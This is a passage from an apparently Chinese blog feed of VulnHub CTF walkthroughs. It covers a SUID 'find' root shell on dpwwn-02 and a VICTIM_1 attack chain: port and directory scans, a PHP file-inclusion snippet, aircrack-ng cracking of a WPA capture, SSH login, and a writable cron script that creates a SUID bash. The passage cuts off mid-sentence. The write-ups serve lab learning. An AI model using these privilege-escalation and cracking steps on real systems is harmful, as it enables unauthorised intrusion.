/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3419    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign<br>     6452    101 -rwsr-sr-x   1 root     root              102600 Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine<br>     7622    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/7270/usr/sbin/pppd<br></code></pre></td></tr></table></figure><h3 id="find-SUID"><a href="#find-SUID" class="headerlink" title="find SUID"></a>find SUID</h3><p>竟然看到了 find 文件，那就直接使用 gtf 找 exp 吧</p><p><img src="/pic/a0775d3feceaf3a04106ad651fd0348b_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dpwwn-02:/home/rootadmin$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www-data@dpwwn-02:/tmp$ find . -<span class="hljs-built_in">exec</span> /bin/sh -p \; -quit              <br>find . -<span class="hljs-built_in">exec</span> /bin/sh -p \; -quit<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) <span class="hljs-built_in">groups</span>=33(www-data)<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>dpwwn-02-FLAG.txt  snap<br><span class="hljs-comment"># cat dpwwn-02-FLAG.txt</span><br><span class="hljs-built_in">cat</span> dpwwn-02-FLAG.txt<br><br>Congratulation! You PWN this dpwwn-02. Hope you enjoy this boot to root CTF.<br>Thank you. <br><br>46617323 <br>24337873 <br>4b4d6f6f <br>72643234 <br>40323564 <br>4e443462 <br>36312a23 <br>26724a6d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VICTIM_1 靶机</title>
    <link href="/2023/06/10ac18445f7e.html"/>
    <url>/2023/06/10ac18445f7e.html</url>
    
    <content type="html"><![CDATA[<h1 id="VICTIM-1-靶机"><a href="#VICTIM-1-靶机" class="headerlink" title="VICTIM_1 靶机"></a>VICTIM_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.120<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 07:48 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.120<br>Host is up (0.00036s latency).<br>Not shown: 65530 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>8080/tcp open  http-proxy<br>8999/tcp open  bctp<br>9000/tcp open  cslistener<br>MAC Address: 08:00:27:CE:FC:4B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.42 seconds<br></code></pre></td></tr></table></figure><p>开放了22,80,8080,8999,9000 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,8080,8999,9000 192.168.56.120    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 07:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.120<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 ea:e8:15:7d:8a:74:bc:45:09:76:34:13:2c:d8:1e:62 (RSA)<br>|   256 51:75:37:23:b6:0f:7d:ed:61:a0:61:18:21:89:35:5d (ECDSA)<br>|_  256 7d:36:08:ba:91:ef:24:9f:7b:24:f6:64:c7:53:2c:b0 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: 403 Forbidden<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>8080/tcp open  http    BusyBox httpd 1.13<br>|_http-title: 404 Not Found<br>8999/tcp open  http    WebFS httpd 1.21<br>|_http-server-header: webfs/1.21<br>|_http-title: 0.0.0.0:8999/<br>9000/tcp open  http    PHP cli server 5.5 or later (PHP 7.2.30-1)<br>|_http-title: Uncaught Exception: MissingDatabaseExtensionException<br>MAC Address: 08:00:27:CE:FC:4B (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|storage-misc<br>Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (93%), Synology DiskStation Manager 5.X (87%)<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2<br>Aggressive OS guesses: Linux 4.15 - 5.8 (93%), Linux 5.0 - 5.4 (93%), Linux 5.0 - 5.5 (90%), Linux 2.6.32 (87%), Linux 3.10 - 4.11 (87%), Linux 3.2 - 4.9 (87%), Linux 3.4 - 3.10 (87%), Synology DiskStation Manager 5.2-5644 (87%), Linux 2.6.32 - 3.10 (86%), Linux 2.6.32 - 3.13 (86%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.68 seconds<br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统，80 端口 403 没有权限，8080 端口 404 没找到资源，8999 WebFS，9000 PHP cli server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo nmap --script=vuln -p22,80,8080,8999,9000 192.168.56.120            <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 08:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.120<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">8080/tcp open  http-proxy</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>8999/tcp open  bctp<br>9000/tcp open  cslistener<br>MAC Address: 08:00:27:CE:FC:4B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 94.78 seconds<br><br></code></pre></td></tr></table></figure><p>漏洞脚本扫描没什么结果。依次查看各个端口的界面</p><h2 id="Web-服务查看"><a href="#Web-服务查看" class="headerlink" title="Web 服务查看"></a>Web 服务查看</h2><p>80 端口提示<code>No configuration file found and no installation code available. Exiting...</code></p><p><img src="/pic/5e189dc8f8913672fce1b39269dc14ce_MD5.png"></p><p>8080 端口提示 404</p><p><img src="/pic/fa28f5e1da8a2365d72fdb4e121aeffd_MD5.png"></p><p>8999 端口列出来一些文件，看起来是 wordpress，但是没有 wp-config.php</p><p><img src="/pic/66a3d6137cda03eedcdf3e44af67799b_MD5.png"></p><p>9000 端口提示数据库连接缺少driver</p><p><img src="/pic/5f37d4e23d6fae957172b7f1ab464a65_MD5.png"></p><p>这时候没什么线索，我先把 8999 端口中的文件夹和文件大致浏览了一遍，没有发现可利用的地方，不过有个 <code>WPA-01.cap</code> 文件，下载后打开是个流量包</p><p><img src="/pic/a4e2a176a6d8a7e6ca2682e4957b2105_MD5.png"></p><p>不知道怎么处理，没看到敏感信息，那接下来进行目录爆破吧，看看是否能得到一些敏感文件或目录</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>先从 80 端口开始爆破，大部分都是 403，所以不再一一列出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo dirsearch -u http://192.168.56.120                      <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.120/_23-06-27_08-04-12.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-27_08-04-12.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.120/<br><br>[08:04:16] 200 -   18KB - /LICENSE.txt <br>[08:04:16] 200 -    5KB - /README.txt<br>[08:04:21] 301 -  324B  - /administrator  -&gt;  http://192.168.56.120/administrator/<br>[08:04:21] 200 -   31B  - /administrator/cache/<br>[08:04:21] 200 -   74B  - /administrator/index.php<br>[08:04:21] 200 -   31B  - /administrator/logs/<br>[08:04:23] 200 -   31B  - /bin/<br>[08:04:23] 200 -   31B  - /cache/<br>[08:04:24] 200 -   31B  - /cli/<br>[08:04:24] 200 -   31B  - /components/<br>[08:04:28] 200 -    0B  - /file.php<br>[08:04:29] 200 -    3KB - /htaccess.txt<br>[08:04:29] 200 -   31B  - /images/ <br>[08:04:30] 200 -   31B  - /includes/<br>[08:04:30] 200 -   74B  - /index.php <br>[08:04:30] 200 -   74B  - /index.php/login/<br>[08:04:31] 200 -   31B  - /layouts/<br>[08:04:31] 200 -   31B  - /libraries/<br>[08:04:33] 200 -   31B  - /media/<br>[08:04:33] 200 -   31B  - /modules/<br>[08:04:36] 200 -   31B  - /plugins/<br>[08:04:38] 200 -   33B  - /robots.txt<br>[08:04:38] 200 -  829B  - /robots.txt.dist<br>[08:04:41] 301 -  320B  - /templates  -&gt;  http://192.168.56.120/templates/ <br>[08:04:41] 200 -   31B  - /templates/index.html                            <br>[08:04:41] 200 -   31B  - /templates/<br>[08:04:41] 200 -    0B  - /templates/beez3/<br>[08:04:41] 200 -    0B  - /templates/system/                               <br>[08:04:41] 200 -    0B  - /templates/protostar/<br>[08:04:42] 200 -   31B  - /tmp/ <br></code></pre></td></tr></table></figure><p>size 为 31B 的都是回显为空的，为 0B 的是无回显的，<code>htaccess.txt</code> 和 <code>README.txt</code> 表明这原本是个 joomla-cms，<code>robots.txt</code> 里是被嘲讽的信息 <code>Disallow: h@ck3rz!</code>，尝试了一下确实不是目录，<code>robots.txt.dist</code> 是 joomla 的默认 disallow 目录。80 端口到现在为止没什么收获。扫描下 8080 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo dirsearch -u http://192.168.56.120:8080<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.120-8080/_23-06-27_08-17-47.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-27_08-17-47.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.120:8080/<br><br>[08:17:47] Starting: <br>[08:17:48] 200 -    0B  - /.bash_history                                   <br>[08:17:48] 200 -  220B  - /.bash_logout                                    <br>[08:17:48] 200 -    4KB - /.bashrc                                         <br>[08:17:49] 302 -    0B  - /.local  -&gt;  /.local/                            <br>[08:17:49] 200 -  807B  - /.profile                                        <br>[08:17:50] 200 -   66B  - /.selected_editor                                <br>[08:17:50] 200 -  765B  - /.viminfo                                         <br>[08:18:01] 403 -   93B  - /cgi-bin/                                         <br>[08:18:05] 200 -   63B  - /file.php                                         <br>[08:18:07] 403 -   93B  - /httpd.conf                                       <br>[08:18:12] 200 -   23B  - /passwords.txt                                   <br>Task Completed<br></code></pre></td></tr></table></figure><p>这次感觉比较有东西，但是打开后发现 viminfo 文件中只有对网络操作的记录 <code>/etc/sysconfig/network</code>，file.php 进入直接下载下来了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;directory/&#x27;</span> . <span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>感觉可能存在文件包含。passwords.txt 里又是被嘲讽的句子</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">Hahahaha</span></span>...Try Harder!<br></code></pre></td></tr></table></figure><p>到这里 8080 端口已有的信息已经处理完了，看看 9000 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo dirsearch -u http://192.168.56.120:9000/<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.120-9000/-_23-06-27_08-32-26.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-27_08-32-26.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.120:9000/<br><br>[08:32:26] Starting:<br>[08:33:39] 200 -    4B  - /files/<br>[08:33:39] 200 -    4B  - /files<br>[08:33:39] 200 -    4B  - /files/tmp/<br>[08:33:39] 200 -    4B  - /files/cache/ <br>[08:33:47] 200 -    0B  - /index.php<br>[08:35:25] 200 -  195B  - /files/.htaccess                                 <br>[08:35:25] 200 -  195B  - /files/.htaccess/<br></code></pre></td></tr></table></figure><p>files 目录只有简单的一句 <code>no</code>，<code>.htaccess</code> 文件里也没什么东西</p><p><img src="/pic/3f99cc0f1be7e5f210af50a7c58ae727_MD5.png"></p><p>感觉现在比较可以作为突破点的是 file.php 文件内容中展现出的文件包含漏洞，尝试在各个端口构造文件包含漏洞的利用</p><p><img src="/pic/014cf963e6238d7a9a9dc7549f4ccb62_MD5.png"></p><p>但是 403 ……快山穷水尽了</p><h2 id="aircrack-ng-爆破"><a href="#aircrack-ng-爆破" class="headerlink" title="aircrack-ng 爆破"></a>aircrack-ng 爆破</h2><p>不过还有个文件 <code>WPA-1.cap</code> 刚才一直不知道怎么处理，搜一搜吧，刚开始尝试搜 <code>cap penetration</code>，没什么有价值的信息，后续加上了文件名中的 <code>wpa</code> 搜索结果如下</p><p><img src="/pic/e510b781a7c8a0beda69849426f75f46_MD5.png"></p><p>第一个链接点进去。我们只想对 cap 文件进行处理，页面搜索 <code>.cap</code></p><p><img src="/pic/a4b064862ddf1bc95b1ad66fb11ad872_MD5.png"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">-b &lt;bssid&gt; : <span class="hljs-type">target</span> selection: <span class="hljs-keyword">access</span> point<span class="hljs-symbol">&#x27;s</span> MAC<br></code></pre></td></tr></table></figure><p>-b 参数是用来指定接入点的 MAC，这里我们先尝试不添加这个参数直接开始运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.<span class="hljs-built_in">cap</span> <br>Reading packets, please <span class="hljs-built_in">wait</span>...<br>Opening WPA-01.<span class="hljs-built_in">cap</span><br>Resetting EAPOL Handshake decoder state.<br>Read 1918 packets.<br><br>   <span class="hljs-comment">#  BSSID              ESSID                     Encryption</span><br><br>   1  5C:D9:98:5A:B6:62  dlink                     WPA (1 handshake)<br><br>Choosing first network as target.<br><br>Reading packets, please <span class="hljs-built_in">wait</span>...<br>Opening WPA-01.<span class="hljs-built_in">cap</span><br>Resetting EAPOL Handshake decoder state.<br>Read 1918 packets.<br><br>1 potential targets<br><br><br>                               Aircrack-ng 1.7 <br><br>      [00:00:14] 70447/14344392 keys tested (4872.59 k/s) <br><br>      Time left: 48 minutes, 49 seconds                          0.49%<br><br>                           KEY FOUND! [ p4ssword ]<br><br><br>      Master Key     : 8F C0 1B 1B 85 06 0B 85 23 7C 83 74 F8 4B 4A FD <br>                       50 CE EC 72 6F 85 17 5F B1 14 5E D2 F2 47 5D 1A <br><br>      Transient Key  : 13 41 36 81 4A 92 19 CF EC 14 B8 FD 20 2C D4 2E <br>                       BA A1 95 79 CE 15 5F 1A 2C DE 03 A8 2B 52 68 64 <br>                       D3 77 A7 E4 FF CD 49 0C ED E9 5E 3B 68 E6 83 26 <br>                       06 0C 98 8D 43 B6 7C E4 FE ED 2E 45 90 0D 6D 15 <br><br>      EAPOL HMAC     : 33 A5 CE E2 46 DB 4B 96 86 A1 6E D9 D2 A2 A6 E9 <br></code></pre></td></tr></table></figure><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>找到了密码 <code>p4ssword</code>，但是有个问题，不知道用户名……，从网站里又翻找了半天，还是没找到，最后看了眼 WP，原来 dlink 就是用户名。。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ ssh dlink@192.168.56.120  <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.120 (192.168.56.120)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:ePua4qlxyyVdR3vIDdxTLN/vcsunu7mAZICrDcLW8m0.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.120<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">dlink@192.168.56.120\&#x27;</span>s password: <br>Last login: Tue Apr  7 23:36:49 2020 from 192.168.86.99<br>dlink@victim01:~$ <span class="hljs-built_in">whoami</span><br>dlink<br>dlink@victim01:~$ <span class="hljs-built_in">ls</span> -liah<br>total 20K<br>152513 drwxr-xr-x 2 dlink dlink 4.0K Apr 22  2020 .<br>131074 drwxr-xr-x 4 root  root  4.0K Apr  7  2020 ..<br>153736 lrwxrwxrwx 1 dlink dlink    9 Apr  7  2020 .bash_history -&gt; /dev/null<br>153733 -rw-r--r-- 1 dlink dlink  220 Apr  7  2020 .bash_logout<br>152516 -rw-r--r-- 1 dlink dlink 3.7K Apr  7  2020 .bashrc<br>153734 -rw-r--r-- 1 dlink dlink  807 Apr  7  2020 .profile<br>dlink@victim01:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:ce:<span class="hljs-built_in">fc</span>:4b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.120/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 528sec preferred_lft 528sec<br>    inet6 fe80::a00:27ff:fece:fc4b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>dlink@victim01:~$ <span class="hljs-built_in">uname</span> -a<br>Linux victim01 4.15.0-96-generic <span class="hljs-comment">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>dlink@victim01:~$ sudo -l<br>User dlink may run the following commands on localhost:<br>    (ALL) NOPASSWD: /usr/bin/TryHarder!<br>dlink@victim01:~$ <span class="hljs-built_in">ls</span> -liah /usr/bin/TryHarder!<br><span class="hljs-built_in">ls</span>: cannot access <span class="hljs-string">&#x27;/usr/bin/TryHarder!&#x27;</span>: No such file or directory<br><br></code></pre></td></tr></table></figure><p><code>sudo -l</code> 的结果中又被戏耍了，看一看 bin 目录的权限，无法写个同名的文件进去。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>看看别的吧，定时任务呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/usr/bin$ <span class="hljs-built_in">cat</span> /etc/crontab<br>* * * * * /tmp/script.sh<br></code></pre></td></tr></table></figure><p>调用了一个 sh 文件，tmp 目录又空空如也且可控，我们写个 script.sh 进去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&quot;</span> &gt; script.sh<br></code></pre></td></tr></table></figure><p>等了半天也没被运行……搜了一下，感觉可能是脚本中没有环境变量的问题：<a href="https://blog.csdn.net/hyfstyle/article/details/100521248">Linux 